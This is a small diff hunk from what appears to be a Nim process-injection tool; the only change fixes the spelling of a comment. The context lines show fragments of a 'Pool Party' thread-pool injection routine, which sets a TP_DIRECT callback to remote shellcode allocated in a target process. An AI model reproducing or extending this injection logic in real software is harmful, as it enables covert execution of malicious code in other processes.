@@ -92,7 +92,7 @@ proc execute(payload: string, processName: string, sleepSeconds: int = 0, isEncr
         quit(1)
     # echo "Remote shellcode: " & $cast[int](targetPtr).toHex
 
-    # Pool Party varient 7
+    # Pool Party variant 7
     var direct: TP_DIRECT
     direct.Callback = targetPtr
     var remoteDirectAddress: PTP_DIRECT = cast[PTP_DIRECT](VirtualAllocEx(
